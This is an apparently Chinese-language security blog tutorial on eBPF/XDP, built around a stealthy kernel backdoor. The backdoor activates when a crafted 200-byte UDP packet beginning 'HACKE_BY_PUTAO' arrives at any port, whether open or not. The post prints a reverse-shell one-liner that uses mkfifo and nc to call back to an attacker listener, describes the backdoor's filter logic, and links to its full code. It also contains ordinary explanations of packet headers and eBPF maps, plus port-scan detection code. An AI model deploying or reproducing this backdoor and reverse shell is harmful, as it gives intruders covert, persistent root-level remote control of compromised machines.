#  端口没开也能激活+rce？ebpf/XDP 内核级隐蔽后门原理剖析  
原创 putao
                    putao  葡萄网络安全随记   2026-01-30 03:37  
  
初识eBPF/XDP在攻防的作用--实现不开端口情况下的可激活内核级后门  
  
由于某些原因，我有了一些用于学习的空闲时间，更新几篇有关Linux后门编写和流量检测的文章，写完这类，后面发几篇做饭的（苹果炖猪排+红烧羊排+糖醋里脊+小炒肉）。  
  
为什么选ebpf来当回归技术的文章呢？几年前就写过ebpf的后门，当时没记笔记导致现在也忘干净了，这段时间突发奇想就重新开始吧！  
  
今天介绍的ebpf（其实叫eBPF，懒得大小写）的入门教程，里面有三个demo（端口复用的激活后门+DDos过滤器+简单的端口扫描检测拦截器）。  
  
这里我先介绍一下这个后门的作用--比如我们拿到了一台具有root权限且开放了80端口（web服务）的目标机器，，出于不想暴露自己的考虑，给该机器上了一个静默后门，可以通过向任意端口（可以80也可以是没开放的端口）发送指定字符串激活这个后门（例如hacked  
 by   
putao），这样在激活之前是不需要额外端口的，实现了”隐蔽性“。  
  
效果如下  
  
这里强调一下，是可以给目标机器任意端口发包，不管这个端口开没开放，运行的业务是什么也无所谓，后面实现隐藏这个网络连接  
  
先运行后门  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHGWOFWTRBtJPCm5a5jtXAeoKeRGjEdSlkKf8J9aibX7btEQicj6ibTOtvA/640?from=appmsg&wx_fmt=png "")  
  
  
kali上监听端口，  
并发送包含弹shell命令的数据包，命令如下  
  
```
printf %-200s 'HACKE_BY_PUTAOrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.75.128 555 >/tmp/fEND' | nc 192.168.75.133 111 -u
```  
  
  
命令执行成功，弹回来了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHxj4ibUkjOeFLFLD4KHQSciaKaCho4eVQCy8w2pMe2bakENiahLDqyIiccg/640?from=appmsg&wx_fmt=png "")  
  
  
  
关于这个后门的实现原理和效果，懒得看这篇文章（啰嗦的）直接看代码和视频  
  
代码在  
  
https://github.com/putaomo1i/ebpf_xdp_blackdoor/  
  
  
粗略讲解+演示视频在  
  
  
【初识eBPF/XDP在攻防的作用--可任意端口激活的后门-哔哩哔哩】 https://b23.tv/Ov1AFx5  
  
  
好糊，我研究一下咋提升画质，后面重新录重新传b站  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pKH4icJWoI5ia9hl0lkJT5OvF6UicommFcPeg41GH260I1icCjfA7MyAUMqGCrqKXWbAHxVggSiazusaIjGfWHhfXow/640?wx_fmt=jpeg "")  
  
  
  
除了本次后门，我还写了两个防的案例（防  
ddos+防  
端口扫描）  
，碍于篇幅太长与公众号排版难看问题，怕影响阅读体验，下一期发  
  
基于ebpf xdp的检测ddos并主动阻断，效果如图1  
  
基于ebpf xdp的检测端口扫描并阻断，效果如图2。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHCb71f2tjKqktcbBmjbHDibWWQAcl8wDhjGXW8uqfNwvaBk8tprknc7g/640?from=appmsg&wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHv3cQx5ic1gfK4mcxTlSgSgaE91oH26vbufhZM4VlOKhYicJqojg54Glw/640?wx_fmt=png&from=appmsg "")  
  
后续更新内容将继续围绕基于ebpf的攻防技术，攻击手法为高级后门、隐藏文件、隐藏进程、提权（吹牛逼呢，提权还没看明白，但寇可往我亦可往），防御手法就是编写对应的排查工具（其实是没想好主题）。  
  
本文大纲：  
  
本文约1.2w字，阅读时间预计20-30分钟，建议吃饭时看  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHIfxIGJvxpc5RFmuhgXfUlkgFvLVthMHYzssic7e6GOpgNHp4VOV5arA/640?wx_fmt=png&from=appmsg "")  
  
  
零、撕开ebpf、xdp和网络架构的面纱  
  
何为eBPF？  
  
ebpf起源于BPF，Bpf是用于过滤网络报文的虚拟机。  
  
后续在bpf基础上拓展了一些方面，例如采用64位体系架构、与网络子系统分离、增加Maps用来存储全局数据、增加辅助函数，形成了ebpf，其中cbpf对监听到的流量只有读权限，ebpf可以改数据。一个运行在Linux内核中的安全、高效的虚拟机。它允许开发者在不修改内核源码、不重启系统的前提下，向内核动态注入程序，用于处理网络包、监控系统调用、跟踪性能等，  
可用于数据包的捕获（监控）、流量分析、过滤和修改  
。  
  
而且ebpf是事件型触发程序（这个词可能不准确，我自己编的），就是加载一个ebpf程序后，只要没经过一个包，就会触发、运行这个ebpf程序一次  
  
bpf工作原理  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHAekr3Vftia2Mlm2zUHjYgyGf4ic8iaA05epiaLn5cxLz07CbTuvunezdQw/640?from=appmsg&wx_fmt=png "")  
  
XDP是什么  
  
xdp是  
 eBPF   
的一个子集，专为处理网络数据包设计。它能够在网络数据包刚被网卡驱动接收、尚未进入内核完整协议栈时就进行处理（数据包解析之前，  
网卡驱动/内核网络栈之前  
）。这意味着XDP程序拥有处理网络流量的最高优先权和最低延迟。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHQHU3ssdNszItuTWDmNjm1Jfo9WHYatJrPAakj9G8SqQzFq3WgXl6ww/640?wx_fmt=png&from=appmsg "")  
  
例如上图中的例子：  
  
在Linux内核网络堆栈中添加一个检查点(checkpoint)（在NIC中接收到数据包之后）。该checkpoint应将数据包传递给eBPF程序，该程序将决定如何处理该数据包：丢弃该数据包(drop)或让其继续通过正常路径。这里有一个典型案例就是ddos过滤器（一会揭晓）。  
  
其中XDP有三种模式，性能依次递增：通用模式（所有驱动都支持）、驱动原生模式（需驱动支持）、硬件卸载模式（由网卡硬件直接执行）  
  
一句话总结：  
XDP是一种允许在内核网络驱动层最早点（远早于防火墙）运行自定义eBPF程序的高性能、可编程数据路径技术。  
  
OSI七层网络模型介绍  
  
这不计网知识嘛，先看一个架构图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHviccBnNWSc0NAZyrmB7iabERt45YlT3RVicQTxEqxByHjETWhib9K9j0dQ/640?from=appmsg&wx_fmt=png "")  
  
L1是  
物理层  
，负责机械、电子、接口通讯信道上的原始比特流传输，可以理解为基础硬件设施。  
  
L2层是数据链路层（以太网层面，局域网通讯），例如通过识别  
vlan和MAC  
地址负责物理寻址，  
  
L3是网络层（  
ip层面  
）。负责控制子网的运行，如逻辑编址、分组传输、路由选择。  
  
L4传输层（  
TCP/UDP层面  
）。比如基于TCP之上的X.25协议。  
  
L5会话层。负责不同机器上的用户之间建立及管理会话。比如LDAP、SSL。  
  
L6表示层。  
  
L7应用层。比如HTTP  
   
WEB服务、FTP、SMTP这些大家熟悉的协议。  
  
防火墙对应的工作层级是网络层（L3）和传输层（L4）。  
  
WAF在L7应用层。  
  
IPS在网络层到应用层（L3–L7）。  
  
画一个图让读者更直观的感受linux的网络架构  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHdEtI50qzaabqticQaica7n3ow8IGyDpSRaFtbpYGa75n5RYNwH8z5kUQ/640?from=appmsg&wx_fmt=png "")  
  
如上图，XDP是工作在数据到达内核TCP/IP协议栈之前  
  
剥洋葱般看数据包的构成  
  
以一个再以太网环境下的典型数据包举例，结构如下  
  
1.以太网头部（Ethernet  
   
Header）  
  
2.IP   
头部（IP  
   
Header）  
  
3.TCP   
头部（TCP  
   
Header）  
  
4.数据（Payload）  
  
现在让我一层一层的刨析，虽然这里很基础但极其关键，请认真看哈，要不到后面用指针去数据包里找数据时会一头雾水（这辈子没写过这么多注释）  
  
a、以太网头部  
  
以太网头部  
是数据包的最前部分，包含了网络硬件层（如网卡）的信息。以太网头部主要包括：  
  
目标  
 MAC   
地址（6  
   
字节）  
：数据包的接收方设备的物理地址。  
  
源  
 MAC   
地址（6  
   
字节）  
：数据包的发送方设备的物理地址。  
  
协议类型（2  
   
字节）  
：表示数据包中封装的上层协议。常见的协议类型有：  
  
0x0800  
   
表示  
 IP   
协议。  
  
0x0806  
   
表示  
 ARP   
协议。  
  
```
struct ethhdr {    unsigned char h_dest[6];    // 目标 MAC 地址    unsigned char h_source[6];  // 源 MAC 地址    unsigned short h_proto;     // 协议类型};
```  
  
  
b、IP   
头部  
  
IP   
头部  
定义了与网络层相关的信息。它包含了数据包的源  
 IP   
和目标  
   
IP，以及协议类型等信息。IP  
   
头部包括：  
  
源  
 IP   
地址（4  
   
字节）  
  
目标  
 IP   
地址（4  
   
字节）  
  
协议类型（1  
   
字节）  
：表示封装在  
 IP   
数据包中的协议（如  
   
TCP、UDP）。  
  
强调一点：：IP  
   
头理论上可能带  
   
options，头长度不总是  
 20   
字节；XDP  
   
里做泛化解析通常会额外参考  
   
ihl  
（我代码里没用，不严谨，我检讨）。  
  
```
struct iphdr {    __u32 saddr; // 源 IP 地址    __u32 daddr; // 目标 IP 地址    __u8 protocol; // 协议类型（如 TCP, UDP）    // 其他字段，如总长度、标识符、TTL 等};
```  
  
  
c、TCP   
头部  
  
TCP   
头部  
定义了与传输层相关的信息，主要包括源端口、目标端口、序列号、确认号等。TCP  
   
头部包括：  
  
源端口（2  
   
字节）  
  
目标端口（2  
   
字节）  
  
序列号（4  
   
字节）  
：数据包的序列号。  
  
确认号（4  
   
字节）  
：用于确认接收到的字节流。  
  
```
struct tcphdr {    __u16 source;    // 源端口    __u16 dest;      // 目标端口    __u32 seq;       // 序列号    __u32 ack_seq;   // 确认号    __u16 doff;      // 头部长度    // 其他标志位和字段，如 SYN, ACK 等};
```  
  
  
  
d、TCP   
数据  
  
数据部分  
是数据包的有效负载部分，包含了上层协议（如  
   
HTTP、FTP）的实际数据内容。对于  
 TCP/IP   
网络，数据部分通常就是我们在浏览器中看到的网页内容或传输的文件。  
  
  
```
| 以太网头部 | IP 头部 | TCP 头部 | 数据（Payload） |
```  
  
  
  
解释一下是什么指针？  
  
反正都这么细了，举个例子，putao住在翻斗花园小区一号楼101（内存里也对应一个地址），那么你要来找我约饭，你应该用这个地址来找（访问）我  
  
是不是很枯燥，上代码，例子在防端口扫描的portscan_simple.c里，注释写的很清楚了，不再做额外解释  
  
  
```
void *data_end = (void *)(long)ctx->data_end; //数据包的结束位    void *data = (void *)(long)ctx->data; //数据包的起始位，也就是说现在data指针指向的位置是这个数据包的最开始位置（101房间）        // 确保数据包包含以太网头、IP 头和 TCP 头    //起始位置的指针地址+太网头（ethhdr）、IP 头（iphdr）和 TCP 头（tcphdr）大于结束指针的地址    //ethhdr：以太网帧头部结构，定义在 <linux/if_ether.h> 中    // iphdr：IP 头部结构，定义在 <linux/ip.h> 中    // tcphdr：TCP 头部结构，定义在 <linux/tcp.h> 中    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) > data_end) {        return XDP_PASS; //如果不够就pass丢弃    }        struct ethhdr *eth = data; //指针eth指向数据包的以太网头部部分的位置        // 只处理IPv4包    // h_proto：是以太网头部中的协议字段，表示该数据包的协议类型    //下面是以太网头部数据结构（ethhdr）的结构和定义    //h_dest[6]：目标 MAC 地址（6 字节）    // h_source[6]：源 MAC 地址（6 字节）    // h_proto：协议类型（2 字节），比如 0x0800 表示 IP 协议    //这里eth的大小是不是6+6+2=14，记住这个大小（14）    if (eth->h_proto != bpf_htons(ETH_P_IP)) {        return XDP_PASS;    }    // 刚才说过了eth的大小是14，那么eth + 1=eth + 14字节，就是跳过了eth现在的位置（以太网头部），来到IP 头部的起始位置    // eth 是指向以太网头部的指针，eth + 1 计算出指向 IP 头部的指针    // 现在是头部，结构如下    // struct iphdr {    // __u32 saddr; // 源 IP 地址    // __u32 daddr; // 目标 IP 地址    // __u8 protocol; // 协议类型    // // 其他字段...    // };    struct iphdr *ip = (struct iphdr *)(eth + 1);        // 只处理TCP包    // protocol：是 IP 头部中的字段，表示协议类型    if (ip->protocol != IPPROTO_TCP) {        return XDP_PASS;    }     //还是上面的逻辑，我们跳过 IP 头部，直接指向数据包中的 TCP 头部    // tcphdr结构如下    // source：源端口（2 字节）    // dest：目标端口（2 字节）    // seq：序列号（4 字节）    // ack_seq：确认序列号（4 字节）    // 其他字段如标志位（SYN, ACK）等。    struct tcphdr *tcp = (struct tcphdr *)(ip + 1);        // D. 只处理SYN包 (SYN=1, ACK=0)    if (!(tcp->syn == 1 && tcp->ack == 0)) {        return XDP_PASS;    }        // 关键检测逻辑开始    // 源 IP 地址，从 IP 头部获取    // iphdr 结构体 示例：    // struct iphdr {    // __u32 saddr; // 源 IP 地址    // __u32 daddr; // 目标 IP 地址    // // 其他字段...    // };// src_ip指向源ip地址    __u32 src_ip = ip->saddr;
```  
  
  
e   
UDP头部  
  
```
以太网头 (14字节) ← eth指针指向这里├── dest_mac[6] 目标MAC地址├── src_mac[6] 源MAC地址└── h_proto (2) 协议类型（0x0800=IPv4）IP头 (20字节) ← ip指针指向这里├── version/ihl (1) 版本/头部长度├── tos (1) 服务类型├── tot_len (2) 总长度（IP头+数据）├── id (2) 标识├── frag_off (2) 分片偏移├── ttl (1) 生存时间├── protocol (1) 协议（17=UDP）├── check (2) 头部校验和├── saddr (4) 源IP地址└── daddr (4) 目标IP地址UDP头 (8字节) ← udp指针指向这里├── source (2) 源端口├── dest (2) 目标端口├── len (2) UDP总长度（头部8字节+数据）└── check (2) 校验和UDP Payload (可变) ← payload指针指向这里└── 你的应用数据（如"HACKE_BY_PUTAO命令END"）
```  
  
  
udp->len  
   
表示  
   
UDP头  
 + payload   
的总长度  
，取值要  
   
用  
bpf_ntohs  
。  
  
常见校验逻辑（你写得很典型）：  
  
udp_len >= sizeof(struct udphdr)  
   
才算合法  
  
payload   
长度  
 =  
   
udp_len - sizeof(udphdr)  
  
真正读取  
 payload   
前，再用  
   
data_end  
   
确认不会越界（因为包可能被截断、或头字段不可信）  
  
例子见  
xdp_blackdoor_s1mple.c代码  
  
一、ebpf能干球？  
  
先说ebpf程序类型  
  
```
网络相关：XDP程序：最快，在网卡驱动层运行TC程序：流量控制层Socket过滤器：socket层面cgroup程序：容器网络非网络：跟踪程序：性能分析安全程序：权限检查
```  
  
  
可以作恶（hacker），也可以监控流量发现告警  
  
为什么可以作恶？  
  
认真看前言的读者可能已经有答案了  
  
1.ebpf木马先于基于用户态套接字的防火墙  
  
2.是内核级权限  
  
3.可动态加载、卸载，不在磁盘中留下后门文件（可内存加载）  
  
4.eBPF程序运行于虚拟机内，隐蔽性  
  
5.拥有强大的处理数据包能力，可以做协议解析、内容匹配、流量篡改、隧道封装等  
  
对于hacker可以干什么？  
  
1.  
隐蔽通信  
，作为可激活后门（本次实现）  
  
2.  
流量窃取与重定向  
，可在TC层窃取或篡改数据  
  
（TC：  
网络层（L3）入口/出口  
。在协议栈处理流程中，  
sk_buff  
已分配，但尚未提交给上层协议或网卡队列。）  
  
3.  
内核后门  
，在  
tracepoint  
或  
kprobe  
挂钩点，劫持系统调用，隐藏文件、进程或网络连接（下次实现）  
  
为什么可以用于监测流量？  
  
还是上面的原因  
  
1.网络位置靠前，挂  
XDP  
上，能获取内核网络栈的完整元数据（如丢包原因、队列延迟）  
  
（XDP：  
链路层（L2）刚结束后  
。位于网络设备驱动接收数据包的  
最早  
路径上，在分配  
sk_buff  
内核数据结构  
之前  
。）  
  
2.内核级，检测速度快，处理路径极短，无用户态-内核态上下文切换开销  
  
3.遇到攻击流量，可以立马丢弃  
  
  
二、小试牛刀--初探ebpf的网络效果  
  
作为一篇科普向的文章，  
第二章节  
应是ebpf编程的扫盲，但我不知道该从哪写起，那干脆务实一点，从一个简单的demo编写开始，一边讲实现原理一边解释有关知识好了  
  
新手村嘛，那我就用下面这篇文章里的例子来讲解一个丢弃所有数据包的简单demo  
  
开始使用  
 XDP   
|红帽开发者  
  
1.   
安装必要工具包  
  
```
# 更新系统sudo apt updatesudo apt upgrade -y#安装编译工具和内核头文件sudo apt install -y build-essential clang llvm gcc make libbpf-dev libelf-dev zlib1g-dev \    linux-headers-$(uname -r) pkg-config libssl-dev flex bison#安装bpftool（可能需要从源码编译或使用snap）sudo apt install -y linux-tools-common linux-tools-$(uname -r)#或者从源码安装：# git clone https://github.com/libbpf/bpftool.git#cd bpftool/src && make && sudo make install
```  
  
  
  
  
这里可能缺了一部分，因为我这个虚拟机已经装过环境了，想了一下，上面这些应该够用了，大家在实践过程中，按实际报错apt  
   
install所需工具  
  
2.   
创建简单  
 XDP   
程序  
  
创建文件  
   
xdp_drop.c  
：  
  
```
// xdp_drop.c#include <linux/bpf.h>//包含必要的ebpf的头文件，这个头文件里有常量XDP_DROP的定义（见下面截图）#include <bpf/bpf_helpers.h>//用于较新内核，包含libbpf提供的便利函数SEC("xdp_drop")int xdp_drop_prog(struct xdp_md *ctx)//xdp_md是结构体类型（XDP元数据），被定义在<uapi/linux/bpf.h>中{    return XDP_DROP;  // 丢弃所有数据包}char _license[] SEC("license") = "GPL";//许可证声明
```  
  
  
常量XDP_DROP的定义  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHSJibic1JibQicIjocScTtW3N3ID6lWtlxsiawJCEQy6M5FnvudMyE5GPLKw/640?from=appmsg&wx_fmt=png "")  
  
就是丢弃这个包  
  
拓展一下  
  
XDP程序必须返回以下值之一  
  
XDP_PASS  
   
=   
2：传递到网络栈  
  
XDP_DROP  
   
=   
1：丢弃数据包  
  
XDP_TX  
   
=   
4：从同一接口转发  
  
XDP_REDIRECT  
   
=   
5：重定向到其他接口  
  
XDP_ABORTED  
   
=   
0：异常中止（用于调试）  
  
3.编译为  
 BPF   
字节码  
  
直接使用  
 clang   
编译  
  
clang -O2 -g -Wall -target bpf -c xdp_drop.c -o xdp_drop.o  
  
注意这里指定编译目标为  
 BPF   
字节码（不是普通的  
 x86/ARM   
机器码）（-target  
   
bpf）  
  
4.验证  
  
先看一下没加载前的接口，一个是  
lo回环接口  
（LOOPBACK），用于本机内部通信，也就是127.0.0.1（localhost）  
  
一个是  
ens33 -   
以太网接口  
（虚拟机的网卡）  
  
ip link show  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHThpO1y8Njyp1FyqKze9Rm9XiaxXLZz1yygkeLXGiaRvqpPlbRL8us1cw/640?from=appmsg&wx_fmt=png "")  
  
加载该程序到lo接口，不影响正常的网络通讯  
  
sudo ip link set dev lo xdp obj xdp_drop.o sec xdp_drop  
  
查看是否加载，看一下网口信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHJzkT2VOTdb79EicZjlGxeI81ya3IUtMiahRYed2hrJ6Yc3S9icBBhYbCA/640?from=appmsg&wx_fmt=png "")  
  
prog/xdp  
：表示这个接口上加载了  
 XDP   
程序  
  
id 371  
：BPF  
   
程序的唯一  
   
ID（每次加载都会不同）  
  
ping一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHIqo3RWYCaf00de5pVmkibBiaPlAdmHEDn1oNw79h3oq20bBWHQOZg6oQ/640?from=appmsg&wx_fmt=png "")  
  
5.卸载ebpf程序还原  
  
ip link set dev   
接口名  
 xdp off  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsH8UbsA52JnFJyJNeqcbL0X5qam10qx4vPW27JZuQBnLwf1WX0XTyYbQ/640?from=appmsg&wx_fmt=png "")  
  
还原成功，恭喜你完成新手教程，让我们迎接第一个boss吧！  
  
三、ebpf的基本编程知识  
  
先解释一下有关maps有关的知识  
  
1.Maps是什么  
  
内核态  
：只做轻量、可证明安全的解析与筛选，把结果写进  
 map  
  
用户态  
：用  
 libbpf/bpftool   
等读取  
   
map，做更重的逻辑（打印、告警、联动）  
  
maps是ebpf的关键组成部分，  
   
它是一种高效的  
 key/value   
存储，map  
   
的内容驻留在内核空间，  
   
但可以  
在用户空间通过文件描述符访问  
，通用类型  
 map   
当前是数组或哈希表结构。  
  
一句话描述：  
把“内核里得到的东西”交给用户态处理  
。  
  
Map是内核中的键值存储，eBPF程序和用户空间程序都能访问。用于：  
  
存储状态（如计数）  
  
传递信息  
  
配置参数。。。  
  
接下来介绍Hash  
   
Maps的基础知识  
  
ebpf编程里的注意事项  
  
eBPF   
程序要通过  
   
验证器（verifier）  
，它会严格限制：  
  
不能越界读写  
：所以必须用  
   
data_end  
   
做上界，任何解引用前先证明不会越界。  
  
不能随意调用库函数  
：内核里不能链接  
   
libc，所以你才需要：  
  
字节序转换用  
   
bpf_ntohs/bpf_htons  
  
字符串比较自己写（  
my_strncmp  
）  
  
数据拷贝用手写循环（而不是  
   
memcpy  
）  
  
循环必须可证明有界  
：你用  
   
[#pragma]()  
 unroll  
   
把循环展开，让  
 verifier   
更容易证明安全。  
  
2.Hash Maps  
  
Hash   
Maps分类如下：  
  
2.1 BPF_MAP_TYPE_HASH  
  
最简单的哈希  
 map。  
  
定义举例：  
  
```
struct bpf_map_def SEC("maps") my_hash = {    .type = BPF_MAP_TYPE_HASH,    .key_size = sizeof(__u32), // 键类型：IP地址（4字节）    .value_size = sizeof(struct data), // 值类型：任意结构    .max_entries = 1000, // 最多1000个键};
```  
  
  
特点：  
  
1.  
支持各种数据类型作为键  
  
使用场景举例：  
  
1.键值存储，将内核态得到的数据，传递给用户态程序  
  
BPF  
MAP  
TYPE  
HASH和BPF  
MAP  
TYPE  
LRU_HASH相比，自动淘汰旧条目，适合缓存  
  
2.存放全局配置信息，供  
 BPF   
程序使用  
  
2.2 BPF  
MAP  
TYPE_ARRAY（数组映射）  
  
定义举例：  
  
  
```
struct bpf_map_def SEC("maps") my_array = {    .type = BPF_MAP_TYPE_ARRAY,    .key_size = sizeof(__u32), // 必须是4字节整数（键号）    .value_size = sizeof(__u64), // 每个键的大小    .max_entries = 100, // 100个键（0-99）};
```  
  
  
  
特点：  
  
1.键必须是连续整数  
  
2.初始化时需要指定  
支持的最大条目数  
（max  
entries）。  
   
满了之后继续插入数据时，会报  
   
E2BIG  
   
错误，（用人话就是键的总量是预设的，固定的，不能更改），同上  
 BPF  
MAP  
TYPE  
HASH  
  
3.不能增加或删除键  
  
使用场景  
  
计数器（扫描器里的计数器场景）  
  
配置参数存储  
  
固定大小的查找表  
  
2.3 BPF  
MAP  
TYPE  
LRU  
HASH（LRU哈希映射）  
  
特点：  
  
1.会自动定期清理  
最久没用  
的健  
  
淘汰（清理）不可控：不能指定淘汰策略（对应1）  
  
2.常用数据保留在内存中  
  
使用场景：  
  
缓存（DNS缓存、路由缓存）  
  
会话跟踪  
  
临时数据存储  
  
2.4 BPF  
MAP  
TYPE  
PERF  
EVENT_ARRAY  
  
3.使用场景举例：  
  
端口扫描检测器：  
HASH + ARRAY  
  
DDos防护：  
LRU  
HASH + PERCPU  
HASH  
（后面会有这个例子）  
  
HTTP请求分析：  
HASH（连接跟踪）  
 +   
HASH（请求跟踪）  
（后面文章也会有）  
  
4.如何调试  
  
bpf_trace_printk  
  
太晚了，不解释了，见后门那个案例  
  
5.映射类型选择决策树  
  
```
开始  │  ├─ 是否需要通过非整数键查找？  │ │  │ ├─ 是 → 需要使用哈希映射  │ │ │  │ │ ├─ 是否需要自动淘汰旧数据？  │ │ │ │  │ │ │ ├─ 是 → 使用 LRU_HASH  │ │ │ │  │ │ │ └─ 否 →   │ │ │ ├─ 是否需要避免锁竞争？  │ │ │ │ │  │ │ │ │ ├─ 是 → 使用 PERCPU_HASH  │ │ │ │ │  │ │ │ │ └─ 否 → 使用 HASH  │ │ │ │  │ │ │ └─ 使用 HASH  │ │ │  │ │ └─ 是否需要避免锁竞争？  │ │ │  │ │ ├─ 是 → 使用 PERCPU_HASH  │ │ │  │ │ └─ 否 → 使用 HASH  │ │  │ └─ 否 → 可以使用数组映射  │ │  │ ├─ 键是否是连续整数？  │ │ │  │ │ ├─ 是 → 使用 ARRAY  │ │ │  │ │ └─ 否 → 需要使用哈希映射  │ │  │ └─ 元素数量是否固定且较少？  │ │  │ ├─ 是 → 使用 ARRAY  │ │  │ └─ 否 → 需要使用哈希映射  │  └─ 根据具体需求选择最终类型
```  
  
  
  
4.基本函数  
  
4.1  
   
bpf_map_lookup_elem  
  
功能  
：查找指定键的元素。如果元素存在，则返回指向它的指针，否则返回  
   
NULL  
。  
  
定义  
  
int bpf_map_lookup_elem(int map_fd, const void *key, void *value);  
  
参数  
：  
  
map_fd  
：BPF  
 map   
的文件描述符。  
  
key  
：需要查找的键。  
  
value  
：查找到的值将存储在这里。  
  
返回值  
：成功返回  
   
0  
，失败返回  
   
-1  
。  
  
用途  
：用于在  
 BPF map   
中查找给定键对应的值。  
  
示例  
：  
  
struct scan_record *record = bpf_map_lookup_elem(&scan_tracker, &src_ip);  
  
这行代码通过  
   
src_ip  
   
查找  
   
scan_tracker  
   
（BPF  
   
map）中与给定键key（该  
 IP   
地址）相关的记录。  
  
4.2  
   
bpf_map_update_elem  
:  
  
功能  
：更新或插入一个元素到  
 map   
中。如果键存在，则更新其值；如果键不存在，则插入一个新的键值对。  
  
定义  
：  
  
int bpf_map_update_elem(int map_fd, const void *key, const void *value, uint64_t flags);  
  
参数  
：  
  
map_fd  
：BPF  
 map   
的文件描述符。  
  
key  
：要更新或插入的键。  
  
value  
：与键对应的值。  
  
flags  
：更新操作的标志，常用的标志有  
   
BPF_ANY  
（如果键存在则更新，如果不存在则插入）等。  
  
返回值  
：成功返回  
   
0  
，失败返回  
   
-1  
。  
  
示例  
：  
  
```
bpf_map_update_elem(&scan_tracker, &src_ip, &new_record, BPF_ANY);
```  
  
  
这行代码在  
   
scan_tracker  
   
map   
中插入或更新与  
   
src_ip  
   
相关的扫描记录。  
  
4.3   
  
bpf_ktime_get_ns  
  
功能  
：返回当前的时间戳，单位为纳秒。  
  
定义  
：  
  
__u64 bpf_ktime_get_ns(void);  
  
返回值  
：当前时间的纳秒级时间戳。  
  
用途  
：用于精确测量时间差，常用于时间窗口检测。  
  
示例  
：  
  
__u64 now = bpf_ktime_get_ns();  
  
4.4  
   
bpf_ntohs  
  
功能  
：将网络字节序（大端序）转换为主机字节序。  
  
定义：  
  
__u16 bpf_ntohs(__u16 val);  
  
参数  
：  
val  
：网络字节序的  
 16   
位数据。  
  
返回值  
：主机字节序的  
 16   
位数据。  
  
用途  
：通常用于将网络数据包中的端口号从网络字节序转换为主机字节序。  
  
示例  
：  
  
__u16 dst_port = bpf_ntohs(tcp->dest);  
  
4.5  
bpf_printk  
:  
  
功能  
：在内核日志中输出信息，方便调试。  
  
定义  
：  
  
int bpf_printk(const char *fmt, ...);  
  
参数  
：  
fmt  
：格式化字符串，后续参数与格式化字符串中的占位符相匹配。  
  
返回值  
：成功时返回输出的字符数，失败时返回负值。  
  
用途  
：常用于内核开发和调试，帮助开发者查看  
 eBPF   
程序的内部状态。  
  
示例  
：  
  
bpf_printk("检测到端口扫描!  
 IP: %u.%u.%u.%u", (src_ip >> 24) & 0xFF, ...);  
  
这行代码将扫描检测到的  
 IP   
地址输出到内核日志，方便查看。  
  
三、基于ebpf实现一个端口复用的激活后门  
  
内核后门逻辑如下  
  
```
收到一个网络数据包    ↓【第一层过滤】检查数据包是否包含完整的以太网头、IP头、UDP头    → 不完整 → 返回 XDP_PASS（放行）    ↓ 完整【第二层过滤】检查是否为IPv4协议    → 不是 → 返回 XDP_PASS    ↓ 是【第三层过滤】检查是否为UDP协议    → 不是 → 返回 XDP_PASS    ↓ 是【第四层过滤】检查UDP数据包长度是否合法    → 长度小于UDP头大小 → 返回 XDP_PASS    ↓ 合法【第五层过滤】检查整个UDP数据包是否在边界内    → 超出边界 → 返回 XDP_PASS    ↓ 在边界内【第六层过滤】检查payload长度是否为200字节    → 不是200字节 → 返回 XDP_PASS    ↓ 正好200字节【第七层过滤】检查前14字节是否为"HACKE_BY_PUTAO"    → 不匹配 → 返回 XDP_PASS    ↓ 匹配【第八层过滤】在payload中查找"END"标记    → 未找到 → 返回 XDP_PASS    ↓ 找到【第九层过滤】检查命令长度是否有效（1-99字节）    → 无效 → 返回 XDP_PASS    ↓ 有效【处理阶段】提取命令并存储到eBPF map    ↓返回 XDP_DROP（丢弃数据包，增加隐蔽性）
```  
  
  
合法的激活数据包要求：  
  
```
协议类型：IPv4 UDP
```  
```
payload长度：200字节
```  
```
数据包开头："HACKE_BY_PUTAO"
```  
```
数据包结尾："END"
```  
```
完整数据包格式："HACKE_BY_PUTAO" + 要执行的命令 + "END" 这里本来是hacked，少写一个d
```  
  
  
这里数据包格式举个例子，要执行的命令是TEST_123_PUTAO                    
  
```
printf %-200s'HACKE_BY_PUTAO TEST_123_PUTAO END' | nc 192.168.75.13380 -u
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHmZU4icS2SprhETeD60BdDibUtD0duIpqI9Svdgt3tTJ66bPHJrBsSVDw/640?from=appmsg&wx_fmt=png "")  
  
我在  
xdp_blackdoor_s1mple.c运行后去读取map里的数据（  
查看map里是否有提取到的包)，提取到了  
  
